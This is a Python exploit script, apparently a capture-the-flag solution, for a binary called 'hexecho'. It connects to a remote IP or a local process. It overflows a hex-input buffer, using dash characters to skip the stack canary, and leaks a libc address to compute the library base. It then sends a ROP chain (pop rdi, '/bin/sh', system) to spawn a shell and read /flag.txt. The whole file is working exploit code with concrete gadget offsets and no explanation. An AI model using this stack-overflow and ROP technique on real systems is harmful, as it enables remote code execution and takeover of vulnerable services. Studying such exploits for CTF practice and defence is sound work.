from ptrlib import *
#import time

remote = True

elf = ELF("./hexecho")
if remote is True:
    sock = Socket('127.0.0.1', 5000)
    sock = Socket('34.170.146.252', 60110)

    # remote
    pop_rdi = 0x2a3e5 # $ ROPgadget --binary ./libc.so.6 --depth 3 | grep "pop rdi ; ret"
    system_func = 0x50d70 # $ nm -D libc.so.6 | grep system
    binsh = 0x1d8678 # $ strings -tx libc.so.6 | grep /bin/sh
    IO_2_1_stdout = 0x21b780 # $ nm -D libc.so.6 | grep _IO_2_1_stdout
    execve_func = 0xeb080 # $ nm -D libc.so.6 | grep execve
    one_gadget = 0xebd43
else:
    sock = Process("./hexecho")

    # local
    pop_rdi = 0x40485
    system_func = 0x61b20
    binsh = 0x1b811b
    IO_2_1_stdout = 0x1fa760
    execve_func = 0x3e400

def addr2InputString(input_addr: int):
    input_string = hex(input_addr)[2:].zfill(16)
    print(input_string)
    return input_string[14:16] + input_string[12:14] + input_string[10:12] + input_string[8:10] + input_string[6:8] + input_string[4:6] + input_string[2:4] + input_string[0:2]

### Staring Program hexecho ###

print(sock.recv(5).decode("utf-8")) # Size: 
sock.sendline("600")

print(sock.recv(11).decode("utf-8")) # Data (hex):
#payload = 'A' * 528
payload = '-' * 264
payload += '-' * 9 # to evade canary
payload += 'A' * 15
payload += '2a13400000000000' # p64(elf.symbol("main"))
payload += 'x'
print(payload)
sock.sendline(payload)

### Leak libcbase, stack canary ###
leak_memory = sock.recvline().decode("utf-8")
#print('[leaked stack]' + leak_memory)
print('[leaked stack]' + leak_memory.replace(' ', '')[323:335])
libcbase_str = leak_memory.replace(' ', '')[333:335] + leak_memory.replace(' ', '')[331:333] + leak_memory.replace(' ', '')[329:331] + leak_memory.replace(' ', '')[327:329] + leak_memory.replace(' ', '')[325:327] + leak_memory.replace(' ', '')[323:325]
#libcbase_str = leak_memory.replace(' ', '')[621:623] + leak_memory.replace(' ', '')[619:621] + leak_memory.replace(' ', '')[617:619] + leak_memory.replace(' ', '')[615:617] + leak_memory.replace(' ', '')[613:615] + leak_memory.replace(' ', '')[611:613]
libcbase = int(libcbase_str, 16) - IO_2_1_stdout
print('[libc base]', hex(libcbase))

print(sock.recv(5).decode("utf-8")) # Size: 
sock.sendline("600")

print(sock.recv(11).decode("utf-8")) # Data (hex): 
#payload =  'A' * 528
payload = '-' * 264
payload += '-' * 9 # to evade canary
payload += 'B' * 15
payload += addr2InputString(libcbase + 0x0baaf9) # xor rax, rax ; ret, for stack alignment 
payload += addr2InputString(libcbase + pop_rdi) # pop rdi ; ret
payload += addr2InputString(libcbase + binsh) # /bin/sh
payload += addr2InputString(libcbase + system_func) # system
payload += 'x'
print(payload)
sock.sendline(payload)

### Get Shell ###
print(sock.recvline().decode("utf-8"))
sock.sendline("cat /flag.txt\x00")
print(sock.recv())
sock.interactive()
